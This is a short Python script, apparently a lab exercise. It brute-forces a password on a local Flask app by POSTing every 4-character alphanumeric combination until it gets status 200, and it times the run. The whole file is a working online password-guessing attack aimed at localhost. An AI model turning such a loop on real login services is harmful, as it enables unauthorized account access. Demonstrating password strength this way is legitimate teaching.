import string
from itertools import product
from typing import Dict
import requests
import time

# python script which will send a POST request to the web app. This request will contain a string
# with possible password. Then it will check if the request was successful. If not, it will send another request

url = 'http://127.0.0.1:5000/'  # URL of Flask server

# generate all characters possible for password level
letters = list(string.ascii_letters)  # includes both uppercase and lowercase letters
numbers = list(string.digits)
special_characters = list(string.punctuation)
pasword_strength: Dict[str, list] = {'numbers': numbers, 'letters': letters, 'numbers_letters': numbers + letters,
                                     'numbers_letters_special_characters': numbers + letters + special_characters}

# Generate combinations for the characters in a list anc check if the request was successful
start_time = time.time()
for combination in product(pasword_strength.get('numbers_letters'), repeat=4):
    tmp = ''.join(combination)
    data = {'user_input': tmp}
    response = requests.post(url, data=data)

    if response.status_code == 200:  # successful request == password found
        print(response.status_code)
        print("password: " + tmp)
        break

end_time = time.time()
elapsed_time = end_time - start_time
print("Elapsed time: " + str(elapsed_time) + " seconds")
